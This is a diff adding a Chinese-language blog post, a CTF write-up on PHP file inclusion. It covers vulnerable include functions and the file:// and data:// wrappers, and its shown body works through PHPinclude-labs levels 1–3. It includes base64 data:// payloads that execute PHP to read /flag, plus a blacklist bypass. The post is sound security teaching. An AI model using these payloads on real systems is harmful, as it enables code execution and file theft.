@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.hanlior.top","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文整理 PHP 文件包含漏洞的常见函数、伪协议与本地靶场练习，记录 CTF+ PHPinclude-labs 各关卡的分析过程。相关测试仅适用于本地或明确授权的环境。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP 文件包含漏洞学习：伪协议与 CTF+ 实战">
+<meta property="og:url" content="https://www.hanlior.top/2026/11/03/php-file-inclusion-learning/index.html">
+<meta property="og:site_name" content="HanLior">
+<meta property="og:description" content="本文整理 PHP 文件包含漏洞的常见函数、伪协议与本地靶场练习，记录 CTF+ PHPinclude-labs 各关卡的分析过程。相关测试仅适用于本地或明确授权的环境。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103155844970.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103160133916.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103161057235.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103162147831.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103162400884.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103162806555.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103163132398.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103164629321.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103165534659.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103170246765.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103174408830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103174445026.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103174458081.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103174908375.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103175917040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103180645672.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103180655699.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103180835766.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103181223535.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103182858012.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103183147887.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103183304383.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103184956055.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103185520836.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103183904265.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103192024149.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103193150218.png">
+<meta property="article:published_time" content="2026-11-03T13:05:00.000Z">
+<meta property="article:modified_time" content="2026-11-03T13:05:04.089Z">
+<meta property="article:author" content="HanLior">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103155844970.png">
+
+
+<link rel="canonical" href="https://www.hanlior.top/2026/11/03/php-file-inclusion-learning/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.hanlior.top/2026/11/03/php-file-inclusion-learning/","path":"2026/11/03/php-file-inclusion-learning/","title":"PHP 文件包含漏洞学习：伪协议与 CTF+ 实战"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PHP 文件包含漏洞学习：伪协议与 CTF+ 实战 | HanLior</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="HanLior" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">HanLior</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">技术学习与实践</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="nav-text">漏洞函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHPinclude-labs"><span class="nav-text">PHPinclude-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-text">level1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">file:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-text">level2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">data:&#x2F;&#x2F; 伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-text">level3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE-1"><span class="nav-text">data:&#x2F;&#x2F; 伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-text">level4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#http-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">http:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-text">level5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#http-%E4%BC%AA%E5%8D%8F%E8%AE%AE-1"><span class="nav-text">http:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level6"><span class="nav-text">level6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">php:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level7"><span class="nav-text">level7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-%E4%BC%AA%E5%8D%8F%E8%AE%AE-1"><span class="nav-text">php:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level8"><span class="nav-text">level8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-%E4%BC%AA%E5%8D%8F%E8%AE%AE-2"><span class="nav-text">php:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level9"><span class="nav-text">level9</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-%E4%BC%AA%E5%8D%8F%E8%AE%AE-3"><span class="nav-text">php:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level10"><span class="nav-text">level10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-get-contents-%E5%87%BD%E6%95%B0"><span class="nav-text">file_get_contents() 函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11"><span class="nav-text">level11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-put-contents-%E5%87%BD%E6%95%B0"><span class="nav-text">file_put_contents()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11plus"><span class="nav-text">level11plus</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%BF%87%E6%BB%A4"><span class="nav-text">自定义过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level12"><span class="nav-text">level12</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">远程文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level13"><span class="nav-text">level13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABNginx"><span class="nav-text">LFI日志文件包含Nginx</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level14"><span class="nav-text">level14</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABApache"><span class="nav-text">LFI日志文件包含Apache</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level15"><span class="nav-text">level15</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">Session文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level16"><span class="nav-text">level16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level17"><span class="nav-text">level17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level18"><span class="nav-text">Level18</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#require-include-once-%E7%BC%BA%E9%99%B7"><span class="nav-text">require&#x2F;include_once 缺陷</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level19"><span class="nav-text">level19</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">HanLior</p>
+  <div class="site-description" itemprop="description">HanLior 的个人博客，记录技术学习、项目实践与思考。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/HanLior" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HanLior" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.hanlior.top/2026/11/03/php-file-inclusion-learning/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="HanLior">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HanLior">
+      <meta itemprop="description" content="HanLior 的个人博客，记录技术学习、项目实践与思考。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PHP 文件包含漏洞学习：伪协议与 CTF+ 实战 | HanLior">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP 文件包含漏洞学习：伪协议与 CTF+ 实战
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-11-03 21:05:00" itemprop="dateCreated datePublished" datetime="2026-11-03T21:05:00+08:00">2026-11-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
+        </span>
+    </span>
+
+  
+<span class="post-meta-item">
+  <span class="post-meta-item-icon">
+    <i class="far fa-calendar-check"></i>
+  </span>
+  <span class="post-meta-item-text">更新于</span>
+  <time itemprop="dateModified" datetime="2026-11-03T21:05:04+08:00">2026-11-03 21:05:04</time>
+</span>
+
+
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>本文整理 PHP 文件包含漏洞的常见函数、伪协议与本地靶场练习，记录 CTF+ PHPinclude-labs 各关卡的分析过程。相关测试仅适用于本地或明确授权的环境。</p>
+<span id="more"></span>
+
+<h1 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h1><table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>功能说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>找不到文件时仅抛出<strong>警告</strong>，脚本继续执行</td>
+</tr>
+<tr>
+<td>include_once()</td>
+<td>与<code>include()</code>功能一致，但<strong>避免重复包含</strong>（同一文件仅加载一次）</td>
+</tr>
+<tr>
+<td><code>require()</code></td>
+<td>找不到文件时抛出<strong>致命错误</strong>，脚本直接停止执行</td>
+</tr>
+<tr>
+<td><code>require_once()</code></td>
+<td>与<code>require()</code>功能一致，且<strong>避免重复包含</strong></td>
+</tr>
+</tbody></table>
+<p>题目来自<a target="_blank" rel="noopener" href="https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1911647525715054592">CTF+ | CTF学习与交流的综合平台</a></p>
+<h1 id="PHPinclude-labs"><a href="#PHPinclude-labs" class="headerlink" title="PHPinclude-labs"></a>PHPinclude-labs</h1><p><strong>文件包含漏洞的核心是：程序本来只想加载指定文件，却让用户输入影响了加载哪个文件，而且没有严格限制范围。</strong> 攻击者因此可能让程序读取敏感文件，或将不可信文件当作代码执行。</p>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><h3 id="file-伪协议"><a href="#file-伪协议" class="headerlink" title="file://伪协议"></a><code>file://</code>伪协议</h3><table>
+<thead>
+<tr>
+<th>部分</th>
+<th>决定什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>file://</code></td>
+<td>从本地文件系统访问文件</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td>将内容作为数据读取</td>
+</tr>
+<tr>
+<td><code>include</code> &#x2F; <code>require</code></td>
+<td>包含文件，并解释其中的 PHP 代码</td>
+</tr>
+</tbody></table>
+<p><code>include</code>和<code>file://</code>结合起来，<code>file</code>先读取文件，然后<code>include</code> 包含文件，解释PHP代码</p>
+<p>例如存在这样的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include $_GET[&#x27;page&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，开发者希望用户传入某个页面文件。但用户控制了整个包含目标，因此也可能传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///tmp/demo.txt</span><br></pre></td></tr></table></figure>
+
+<p>程序处理过程就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户提供路径</span><br><span class="line">    → include 接收路径</span><br><span class="line">    → file:// 定位本地文件</span><br><span class="line">    → PHP 加载并解释文件内容</span><br></pre></td></tr></table></figure>
+
+<p>问题出在<strong>不可信输入直接决定了包含目标</strong>。即使不写 <code>file://</code>，直接传入本地路径也可能存在同样的问题。</p>
+<p>还要结合前面讲过的路径拼接来看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;pages/&#x27; . $_GET[&#x27;page&#x27;] . &#x27;.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>如果把 <code>file:///tmp/demo.txt</code> 放进这个参数，最终会变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pages/file:///tmp/demo.txt.php</span><br></pre></td></tr></table></figure>
+
+<p>这并不会自动变成一次对 <code>/tmp/demo.txt</code> 的 <code>file://</code> 访问。<strong>分析时必须看拼接后的完整字符串。</strong></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103155844970.png" alt="image-20261103155844970"></p>
+<p>传一个GET参数<code>wrappers</code> 那么就构造一下payload</p>
+<p><code>?wrappers=/flah</code> 直接就看到了flag</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103160133916.png" alt="image-20261103160133916"></p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data:// 伪协议"></a><code>data://</code> 伪协议</h3><p><code>data://</code> 可以把字符串中的数据当成一个可读取的流，使用它时，内容直接写在地址里，不需要预先创建文件，也不需要访问远程服务器。</p>
+<p>和刚才的 <code>file://</code> 对照：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///tmp/demo.txt       → 从指定文件取得内容</span><br><span class="line">data://text/plain,Hello    → 内容就是地址中的 Hello</span><br></pre></td></tr></table></figure>
+
+<p>常见的两种形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,内容</span><br><span class="line">data://text/plain;base64,Base64编码后的内容</span><br></pre></td></tr></table></figure>
+
+<p>Base64 形式也一样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;data://text/plain;base64,SGVsbG8=&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>SGVsbG8=</code> 解码后的含义就是<code>Hello</code>,然后把<code>Hello</code> 交给了读取函数</p>
+<p>这里用一个只做加法的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php echo 1 + 2; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;data://text/plain;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取：得到 PHP 源码文本</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含：配置允许时，执行其中的 PHP 代码，输出 3</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$url</span>;</span><br></pre></td></tr></table></figure>
+
+<p>整个过程就是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:// 中的编码数据</span><br><span class="line">    → 包装器解码</span><br><span class="line">    → 得到 &lt;?php echo 1 + 2; ?&gt;</span><br><span class="line">    → include 交给 PHP 解释</span><br><span class="line">    → 输出 3</span><br></pre></td></tr></table></figure>
+
+<p>那么现在来看一下这个level2</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103161057235.png" alt="image-20261103161057235"></p>
+<p>这里就是用的<code>data://</code>伪协议</p>
+<p>其实上面的<code>include</code>就告诉我了我们应该怎么进行拼接</p>
+<p>我们要穿的参数是<code>&lt;?php echo file_get_contents(&#39;/flag&#39;); ?&gt;</code></p>
+<p>但是这个参数首先要base64编码一下才可以</p>
+<p><code>PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKTsgPz4=</code></p>
+<p>这里来拼接一下<code>;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKTsgPz4=</code></p>
+<p>然后出现了一个问题</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103162147831.png" alt="image-20261103162147831"></p>
+<p>问了ai之后发现这里是因为<code>;</code>被当成了参数分割符号，把这个分号进行url编码一下就是<code>%3B</code></p>
+<p>那么重新拼接一下参数<code>%3Bbase64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKTsgPz4=</code></p>
+<p>include成功，得到了flag</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103162400884.png" alt="image-20261103162400884"></p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="data-伪协议-1"><a href="#data-伪协议-1" class="headerlink" title="data:// 伪协议"></a><code>data://</code> 伪协议</h3><p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103162806555.png" alt="image-20261103162806555"></p>
+<p>代码中有过滤名单,会检查 <code>wrappers</code> 参数，匹配到以下内容就不执行 <code>include</code>：</p>
+<ul>
+<li><code>flag</code>，不区分大小写</li>
+<li><code>~ ! @ # $ % ^ &amp; * ( ) - _ + = .</code></li>
+</ul>
+<p>那就想办法绕过这个过滤呗，这里还过滤了等号，所以说base64补位的等号不能出现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>因为php代码最后的<code>?&gt;</code>是可选的，加不加都行</p>
+<p>这个代码base64编码过后是没有🟰的，<code>PD9waHAgcmVhZGZpbGUoJy9mbGFnJyk7</code></p>
+<p>那么继续拼接<code>wrappers</code> 的参数<code>%3Bbase64,PD9waHAgcmVhZGZpbGUoJy9mbGFnJyk7</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103163132398.png" alt="image-20261103163132398"></p>
